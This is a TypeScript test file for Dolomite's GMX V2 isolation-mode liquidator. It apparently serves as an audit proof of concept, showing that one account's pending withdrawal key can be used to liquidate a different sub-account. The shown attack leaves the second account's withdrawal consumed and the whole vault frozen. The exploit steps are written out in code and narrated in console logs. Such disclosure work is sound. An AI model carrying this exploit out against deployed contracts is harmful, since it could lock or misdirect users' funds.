import { BalanceCheckFlag } from '@dolomite-margin/dist/src';
import { expect } from 'chai';
import { BigNumber, BigNumberish, ContractTransaction, ethers } from 'ethers';
import {
  DolomiteRegistryImplementation,
  DolomiteRegistryImplementation__factory,
  EventEmitterRegistry,
  GmxV2IsolationModeTokenVaultV1,
  GmxV2IsolationModeTokenVaultV1__factory,
  GmxV2IsolationModeUnwrapperTraderV2,
  GmxV2IsolationModeVaultFactory,
  GmxV2IsolationModeWrapperTraderV2,
  GmxV2Registry,
  IGmxMarketToken,
  IGmxMarketToken__factory,
  IsolationModeFreezableLiquidatorProxy,
  IsolationModeFreezableLiquidatorProxy__factory,
} from '../../../src/types';
import { AccountStruct } from '../../../src/utils/constants';
import { GMX_V2_CALLBACK_GAS_LIMIT, GMX_V2_EXECUTION_FEE } from '../../../src/utils/constructors/gmx';
import { createContractWithAbi, depositIntoDolomiteMargin } from '../../../src/utils/dolomite-utils';
import { NO_EXPIRY, ONE_BI, ONE_ETH_BI, ZERO_BI } from '../../../src/utils/no-deps-constants';
import { impersonate, revertToSnapshotAndCapture, snapshot } from '../../utils';
import {
  expectEvent,
  expectProtocolBalance,
  expectThrow,
  expectWalletBalance,
} from '../../utils/assertions';
import { createDolomiteRegistryImplementation, createEventEmitter } from '../../utils/dolomite';
import {
  createGmxV2IsolationModeTokenVaultV1,
  createGmxV2IsolationModeUnwrapperTraderV2,
  createGmxV2IsolationModeVaultFactory,
  createGmxV2IsolationModeWrapperTraderV2,
  createGmxV2Library,
  createGmxV2MarketTokenPriceOracle,
  createGmxV2Registry,
  getOracleParams,
} from '../../utils/ecosystem-token-utils/gmx';
import { liquidateV4WithZapParam } from '../../utils/liquidation-utils';
import {
  CoreProtocol,
  disableInterestAccrual,
  getDefaultCoreProtocolConfigForGmxV2,
  setupCoreProtocol,
  setupGMBalance,
  setupTestMarket,
  setupUserVaultProxy,
  setupWETHBalance,
} from '../../utils/setup';
import { getLiquidateIsolationModeZapPath } from '../../utils/zap-utils';

const defaultAccountNumber = ZERO_BI;
const borrowAccountNumber = defaultAccountNumber.add(ONE_BI);
const borrowAccountNumber2 = borrowAccountNumber.add(ONE_BI);

const amountWei = ONE_ETH_BI.mul('1234'); // 1,234
const amountWeiForSecond = ONE_ETH_BI.mul('1234'); // 1,234

describe('IsolationModeFreezableLiquidatorProxy', () => {
  let snapshotId: string;

  let core: CoreProtocol;
  let underlyingToken: IGmxMarketToken;
  let gmxV2Registry: GmxV2Registry;
  let allowableMarketIds: BigNumberish[];
  let unwrapper: GmxV2IsolationModeUnwrapperTraderV2;
  let wrapper: GmxV2IsolationModeWrapperTraderV2;
  let factory: GmxV2IsolationModeVaultFactory;
  let vault: GmxV2IsolationModeTokenVaultV1;
  let marketId: BigNumber;
  let liquidatorProxy: IsolationModeFreezableLiquidatorProxy;
  let eventEmitter: EventEmitterRegistry;

  let solidAccount: AccountStruct;
  let liquidAccount: AccountStruct;
  let liquidAccount2: AccountStruct;
  let withdrawalKeys: string[];
  let depositKey: string | undefined;
  let totalAmountWei: BigNumber;

  before(async () => {
    core = await setupCoreProtocol(getDefaultCoreProtocolConfigForGmxV2());

    const newImplementation = await createContractWithAbi<DolomiteRegistryImplementation>(
      DolomiteRegistryImplementation__factory.abi,
      DolomiteRegistryImplementation__factory.bytecode,
      [],
    );
    await core.dolomiteRegistryProxy.upgradeTo(newImplementation.address);

    liquidatorProxy = await createContractWithAbi<IsolationModeFreezableLiquidatorProxy>(
      IsolationModeFreezableLiquidatorProxy__factory.abi,
      IsolationModeFreezableLiquidatorProxy__factory.bytecode,
      [
        core.dolomiteRegistry.address,
        core.dolomiteMargin.address,
        core.expiry.address,
        core.liquidatorAssetRegistry.address,
      ],
    );

    const gmxV2Library = await createGmxV2Library();
    const userVaultImplementation = await createGmxV2IsolationModeTokenVaultV1(core, gmxV2Library);
    gmxV2Registry = await createGmxV2Registry(core, GMX_V2_CALLBACK_GAS_LIMIT);

    allowableMarketIds = [core.marketIds.nativeUsdc!, core.marketIds.weth];
    factory = await createGmxV2IsolationModeVaultFactory(
      core,
      gmxV2Library,
      gmxV2Registry,
      allowableMarketIds,
      allowableMarketIds,
      core.gmxEcosystemV2!.gmxEthUsdMarketToken,
      userVaultImplementation,
    );
    underlyingToken = IGmxMarketToken__factory.connect(await factory.UNDERLYING_TOKEN(), core.hhUser1);
    unwrapper = await createGmxV2IsolationModeUnwrapperTraderV2(
      core,
      factory,
      gmxV2Library,
      gmxV2Registry,
    );
    wrapper = await createGmxV2IsolationModeWrapperTraderV2(
      core,
      factory,
      gmxV2Library,
      gmxV2Registry,
    );
    const priceOracle = await createGmxV2MarketTokenPriceOracle(core, gmxV2Registry);
    await priceOracle.connect(core.governance).ownerSetMarketToken(factory.address, true);

    // Use actual price oracle later
    marketId = await core.dolomiteMargin.getNumMarkets();
    await setupTestMarket(core, factory, true, priceOracle);
    await disableInterestAccrual(core, core.marketIds.weth);
    await disableInterestAccrual(core, core.marketIds.nativeUsdc!);

    await factory.connect(core.governance).ownerSetAllowableCollateralMarketIds(
      [...allowableMarketIds, marketId],
    );

    await factory.connect(core.governance).ownerInitialize([unwrapper.address, wrapper.address]);
    await core.dolomiteMargin.connect(core.governance).ownerSetGlobalOperator(factory.address, true);

    await gmxV2Registry.connect(core.governance).ownerSetUnwrapperByToken(factory.address, unwrapper.address);
    await gmxV2Registry.connect(core.governance).ownerSetWrapperByToken(factory.address, wrapper.address);

    eventEmitter = await createEventEmitter(core);
    const newRegistry = await createDolomiteRegistryImplementation();
    await core.dolomiteRegistryProxy.connect(core.governance).upgradeTo(newRegistry.address);
    await core.dolomiteRegistry.connect(core.governance).ownerSetEventEmitter(eventEmitter.address);

    await factory.createVault(core.hhUser1.address);
    const vaultAddress = await factory.getVaultByAccount(core.hhUser1.address);
    vault = setupUserVaultProxy<GmxV2IsolationModeTokenVaultV1>(
      vaultAddress,
      GmxV2IsolationModeTokenVaultV1__factory,
      core.hhUser1,
    );

    await setupWETHBalance(core, core.hhUser1, amountWei, core.dolomiteMargin);
    await depositIntoDolomiteMargin(core, core.hhUser1, defaultAccountNumber, core.marketIds.weth, amountWei);

    await core.dolomiteRegistry.ownerSetLiquidatorAssetRegistry(core.liquidatorAssetRegistry.address);
    await core.liquidatorAssetRegistry.ownerAddLiquidatorToAssetWhitelist(marketId, core.liquidatorProxyV4.address);
    await core.liquidatorAssetRegistry.ownerAddLiquidatorToAssetWhitelist(marketId, liquidatorProxy.address);
    await core.dolomiteMargin.ownerSetGlobalOperator(liquidatorProxy.address, true);

    solidAccount = { owner: core.hhUser5.address, number: defaultAccountNumber };
    liquidAccount = { owner: vault.address, number: borrowAccountNumber };
    liquidAccount2 = { owner: vault.address, number: borrowAccountNumber2 };

    await setupGMBalance(core, core.hhUser1, amountWei.add(amountWeiForSecond), vault);
    await vault.depositIntoVaultForDolomiteMargin(defaultAccountNumber, amountWei.add(amountWeiForSecond));
    await vault.openBorrowPosition(
      defaultAccountNumber,
      borrowAccountNumber,
      amountWei,
      { value: GMX_V2_EXECUTION_FEE },
    );
    await vault.openBorrowPosition(
      defaultAccountNumber,
      borrowAccountNumber2,
      amountWeiForSecond,
      { value: GMX_V2_EXECUTION_FEE },
    );

    await expectProtocolBalance(core, vault.address, borrowAccountNumber, marketId, amountWei);
    await expectProtocolBalance(core, vault.address, borrowAccountNumber2, marketId, amountWeiForSecond);
    await expectWalletBalance(vault, underlyingToken, amountWei.add(amountWeiForSecond));
    expect(await vault.isVaultAccountFrozen(defaultAccountNumber)).to.eq(false);
    expect(await vault.isVaultAccountFrozen(borrowAccountNumber)).to.eq(false);
    expect(await vault.isVaultAccountFrozen(borrowAccountNumber2)).to.eq(false);

    snapshotId = await snapshot();
  });

  beforeEach(async () => {
    withdrawalKeys = [];
    depositKey = undefined;
    totalAmountWei = amountWei;
    snapshotId = await revertToSnapshotAndCapture(snapshotId);
  });

  describe('#prepareForLiquidation', () => {

    async function setupBalances(
      account: BigNumber,
      amount: BigNumber
    ) {
      // Create debt for the position
      let gmPrice = (await core.dolomiteMargin.getMarketPrice(marketId)).value;
      let _wethPrice = (await core.dolomiteMargin.getMarketPrice(core.marketIds.weth)).value;

      const _wethAmount = amount.mul(gmPrice).div(_wethPrice).mul(100).div(121);
      await vault.transferFromPositionWithOtherToken(
        account,
        defaultAccountNumber,
        core.marketIds.weth,
        _wethAmount,
        BalanceCheckFlag.To,
      );

      // Devalue the collateral so it's underwater
      gmPrice = gmPrice.mul(80).div(100);
      await core.testEcosystem!.testPriceOracle.setPrice(factory.address, gmPrice);
      await core.dolomiteMargin.ownerSetPriceOracle(marketId, core.testEcosystem!.testPriceOracle.address);

      // Increase the value of ETH, so it's underwater after the liquidation is handled too
      _wethPrice = _wethPrice.mul(140).div(100);
      await core.testEcosystem!.testPriceOracle.setPrice(core.tokens.weth.address, _wethPrice);
      await core.dolomiteMargin.ownerSetPriceOracle(core.marketIds.weth, core.testEcosystem!.testPriceOracle.address);

      let _amountWeiForLiquidation = _wethAmount.mul(_wethPrice).mul(105).div(100).div(gmPrice);
      if (_amountWeiForLiquidation.gt(totalAmountWei)) {
        // Cap the size at amountWei
        _amountWeiForLiquidation = totalAmountWei;
      }
      return {
        amountWeiForLiquidation: _amountWeiForLiquidation,
        wethPrice: _wethPrice,
        wethAmount: _wethAmount
      };
    }

    async function performUnwrapping(_withdrawalKey: any): Promise<ContractTransaction> {
      return await core.gmxEcosystemV2!.gmxWithdrawalHandler.connect(core.gmxEcosystemV2!.gmxExecutor)
        .executeWithdrawal(
          _withdrawalKey,
          getOracleParams(core.tokens.weth.address, core.tokens.nativeUsdc!.address),
          { gasLimit: 10_000_000 },
        );
    }

    enum UnwrapperTradeType {
      FromWithdrawal = 0,
      FromDeposit = 1,
    }

    async function prepareAccountForLiquidation(
        _liquidAccount: AccountStruct,
        liquidatedAccountNumber: BigNumber,
        amountWei: BigNumber
      ): Promise<string> 
      {
      const prepareForLiquidationResult = await liquidatorProxy.prepareForLiquidation(
        _liquidAccount,
        marketId,
        amountWei,
        core.marketIds.nativeUsdc!,
        ONE_BI,
        NO_EXPIRY,
      );
      const filter = eventEmitter.filters.AsyncWithdrawalCreated();
      const withdrawalKey = (await eventEmitter.queryFilter(
        filter, 
        prepareForLiquidationResult.blockNumber))[0].args.key;
      const result = await performUnwrapping(withdrawalKey);
      
      await expectEvent(eventEmitter, result, 'AsyncWithdrawalFailed', {
        key: withdrawalKey,
        token: factory.address,
        reason: `OperationImpl: Undercollateralized account <${vault.address.toLowerCase()}, ${liquidatedAccountNumber.toString()}>`,
      });
      return withdrawalKey;
    }

    async function executeProxyLiquidation(
        _solidAccount: AccountStruct,
        _liquidAccount: AccountStruct,
        _withdrawals: any,
        _deposits: any,
        _amountWeiForLiquidation: any,
        _wethAmount: any
      ) {
      // Give the contract the WETH needed to complete the exchange
      const testTrader = await impersonate(core.testEcosystem!.testExchangeWrapper.address, true, _wethAmount.mul(10));
      await setupWETHBalance(
        core,
        testTrader,
        _wethAmount.mul(5),
        { address: '0x000000000000000000000000000000000000dead' },
      );

      const allKeys = _withdrawals.concat(_deposits);
      const tradeTypes = Array(
        _withdrawals.length
        ).fill(UnwrapperTradeType.FromWithdrawal).concat(
          Array(
            _deposits.length
            ).fill(UnwrapperTradeType.FromWithdrawal))

      const liquidationData = ethers.utils.defaultAbiCoder.encode(
        ['uint8[]', 'bytes32[]'],
        [tradeTypes, allKeys],
      );
      const withdrawals = await Promise.all(withdrawalKeys.map(key => unwrapper.getWithdrawalInfo(key)));
      const deposit = depositKey ? await wrapper.getDepositInfo(depositKey) : undefined;
      const allStructs = withdrawals
        .map(w => ({ inputAmount: w.inputAmount, outputAmount: w.outputAmount }))
        .concat(deposit ? [{ inputAmount: deposit.outputAmount, outputAmount: deposit.inputAmount }] : []);
      const outputAmountForSwap = allStructs
        .reduce((acc, struct) => {
          if (acc.input.gt(ZERO_BI)) {
            const inputAmount = acc.input.lt(struct.inputAmount)
              ? acc.input
              : struct.inputAmount;
            const outputAmount = acc.input.lt(struct.inputAmount)
              ? struct.outputAmount.mul(acc.input).div(struct.inputAmount)
              : struct.outputAmount;

            acc.input = acc.input.sub(inputAmount);
            acc.output = acc.output.add(outputAmount);
          }
          return acc;
        }, { output: ZERO_BI, input: _amountWeiForLiquidation })
        .output;

      const zapParam = await getLiquidateIsolationModeZapPath(
        [marketId, core.marketIds.nativeUsdc!, core.marketIds.weth],
        [_amountWeiForLiquidation, outputAmountForSwap, _wethAmount],
        unwrapper,
        core,
      );
      zapParam.tradersPath[0].tradeData = liquidationData;
      await liquidateV4WithZapParam(
        core,
        _solidAccount,
        _liquidAccount,
        zapParam,
      );
    }

    async function getMarketBalances(account: any) {
      const balances = new Map<string, BigNumber>();;
      const markets = await core.dolomiteMargin.getAccountMarketsWithBalances(account);
      for (const market of markets) {
        const par = await core.dolomiteMargin.getAccountPar(account, market.toNumber());
        balances.set(market.toString(), par.value);
      }
      return balances;
    }

    it.only('exploit liquidations using hijacked withdrawal keys', async () => {

      const {
        amountWeiForLiquidation: _amountWeiForLiquidationOne,
        wethAmount: _wethAmountOne
      } = await setupBalances(borrowAccountNumber, amountWei);
      
      const {
        amountWeiForLiquidation: _amountWeiForLiquidationTwo,
        wethPrice: initialWethPrice,
        wethAmount: _wethAmountTwo
      } = await setupBalances(borrowAccountNumber2, amountWei);

      const firstBorrowerKey = await prepareAccountForLiquidation(liquidAccount, borrowAccountNumber, amountWei);
      console.log(
        `Account ${borrowAccountNumber} liquidation preparation for amount: ${amountWei} done: withdrawal key: ${firstBorrowerKey}`
        );

      console.log("increase the price of WETH by 50% so that the second borrower is also undercollateralized");
      const increasedWethPrice = initialWethPrice.mul(150).div(100);
      await core.testEcosystem!.testPriceOracle.setPrice(core.tokens.weth.address, increasedWethPrice);

      const secondBorrowerKey = await prepareAccountForLiquidation(liquidAccount2, borrowAccountNumber2, amountWei);
      console.log(
        `Account ${borrowAccountNumber2} liquidation preparation for amount: ${amountWei} done: withdrawal key: ${secondBorrowerKey}`
      );

      console.log("decrease the price of WETH by 65% so that the first borrower is undercollateralized but not maximum so as to avoid the amounts equal available bug");
      const decreasedWethPrice = initialWethPrice.mul(35).div(100);
      await core.testEcosystem!.testPriceOracle.setPrice(core.tokens.weth.address, decreasedWethPrice);

      console.log("Balances for accounts before liquidations are normal");
      const liquidAccountOneBeforeBalances = await getMarketBalances(liquidAccount);
      expect(liquidAccountOneBeforeBalances.get(marketId.toString())?.toString()).to.be.equal(amountWei.toString());
      expect(liquidAccountOneBeforeBalances.get(core.marketIds.weth.toString())?.isZero()).to.be.false;
      expect(liquidAccountOneBeforeBalances.get(core.marketIds.nativeUsdc!.toString()) === undefined).to.be.true; // balance 0 but javavascript

      const liquidAccountTwoBeforeBalances = await getMarketBalances(liquidAccount2);
      expect(liquidAccountTwoBeforeBalances.get(marketId.toString())?.toString()).to.be.equal(amountWei.toString());
      expect(liquidAccountTwoBeforeBalances.get(core.marketIds.weth.toString())?.isZero()).to.be.false;
      expect(liquidAccountTwoBeforeBalances.get(core.marketIds.nativeUsdc!.toString()) === undefined).to.be.true; // balance 0 but javavascript

      console.log(`Liquidating account ${liquidAccount.number} but using accounts' ${borrowAccountNumber2} key: ${secondBorrowerKey}`);
      await executeProxyLiquidation(
        solidAccount, 
        liquidAccount, 
        [secondBorrowerKey], 
        [], 
        _amountWeiForLiquidationOne, 
        _wethAmountOne
      );

      console.log("Balances for accounts after liquidations show no change to second account and first account has only liquidation output token");
      const liquidAccountOneAfterBalances = await getMarketBalances(liquidAccount);
      expect(liquidAccountOneAfterBalances.get(marketId.toString()) === undefined).to.be.true; // balance 0 but javavascript
      expect(liquidAccountOneAfterBalances.get(core.marketIds.weth.toString()) === undefined).to.be.true; // balance 0 but javavascript
      expect(liquidAccountOneAfterBalances.get(core.marketIds.nativeUsdc!.toString())?.isZero()).to.be.false; // liquidation output token was in USDC

      const liquidAccountTwoAfterBalances = await getMarketBalances(liquidAccount2);
      expect(liquidAccountTwoAfterBalances.get(marketId.toString())).to.be.equal(liquidAccountTwoBeforeBalances.get(marketId.toString()));
      expect(liquidAccountTwoAfterBalances.get(core.marketIds.weth.toString())).to.be.equal(liquidAccountTwoBeforeBalances.get(core.marketIds.weth.toString()));
      expect(liquidAccountTwoAfterBalances.get(core.marketIds.nativeUsdc!.toString())).to.be.equal(liquidAccountTwoBeforeBalances.get(core.marketIds.nativeUsdc!.toString()));

      console.log(`Since account ${liquidAccount.number} is now over-collateralized, the operation to retrieve his failed withdrawal can initiated by a trusted handler`);      
      
      await gmxV2Registry.connect(core.governance).ownerSetIsHandler(core.hhUser1.address, true);
      const unwrapperAsTrustedHandler = unwrapper.connect(core.hhUser1);
      const result = await unwrapperAsTrustedHandler.executeWithdrawalForRetry(firstBorrowerKey, {gasLimit: 30_000_000});
      await result.wait();
      console.log("But this operation will fail since adding the extra funds from the initial key would be interpreted by DolomiteMargin as an increase in borrowing from the GM market, which is a closed market");
      await expectEvent(eventEmitter, result, 'AsyncWithdrawalFailed', {
        key: firstBorrowerKey,
        token: factory.address,
        reason: `OperationImpl: Market is closing <${marketId}>`
      });

      console.log("The second position has also become over-collateralize during the price variation so continuing liquidation will fail regardless of withdrawal key");
      console.log("If we try to liquidate using the already used second key, even if the second account would of been liquidatable, it reverts on the amount check, which is first");
      await expectThrow(
        executeProxyLiquidation(
          solidAccount, 
          liquidAccount2, 
          [secondBorrowerKey], 
          [], 
          _amountWeiForLiquidationTwo, 
          _wethAmountTwo
        ), 
        "AsyncIsolationModeUnwrapperImpl: Invalid input amount"
        );
        console.log("If we try to liquidate using the unused first key, it reverts because the second account became over-collateralized due to price variations");
      await expectThrow(
        executeProxyLiquidation(
          solidAccount, 
          liquidAccount2, 
          [firstBorrowerKey], 
          [], 
          _amountWeiForLiquidationTwo, 
          _wethAmountTwo
          ), 
          `LiquidateOrVaporizeImpl: Unliquidatable account <${vault.address.toLowerCase()}, ${borrowAccountNumber2.toString()}>`
      );
      
      console.log("Also the second account cannot get his withdrawal back since it was used up by the first liquidator");
      await expectThrow(
        unwrapperAsTrustedHandler.executeWithdrawalForRetry(secondBorrowerKey), 
        "UpgradeableUnwrapperTraderV2: Invalid withdrawal key"
      );
      
      console.log("This leaves the vault frozen until the second account is again liquidatable and then it must use the first key");
      console.log("Since vault is frozen, any and all operations from any other sub-accounts are also frozen")
      expect(await vault.isVaultFrozen()).to.be.true;      
    });
  });
});
